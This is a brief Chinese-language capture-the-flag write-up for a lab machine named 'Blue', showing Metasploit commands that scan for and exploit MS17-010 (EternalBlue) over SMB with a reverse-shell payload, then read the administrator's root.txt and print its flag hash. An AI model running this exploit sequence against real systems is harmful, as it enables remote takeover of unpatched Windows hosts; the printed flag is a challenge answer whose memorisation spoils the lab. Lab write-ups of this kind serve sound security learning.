# Blue

> victim: 10.10.10.40

### Light Scan

只有139和445

尝试一下ms17-010和ms08-067

## smb尝试

### ms17-010(msf)

#### 检测

```bash
msfconsole

use auxiliary/scanner/smb/smb_ms17_010
set rhost 10.10.10.40
run
```

检测可行

#### 攻击

```bash
use exploit/windows/smb/ms17_010_psexec
set payload windows/shell/reverse_tcp
set rhost 10.10.10.40
set lhost 10.10.14.19
run
```

直接KO...

```shell
type "C:\Users\Administrator\Desktop\root.txt"
```

```
ff548eb71e920ff6c08843ce9df4e717
```

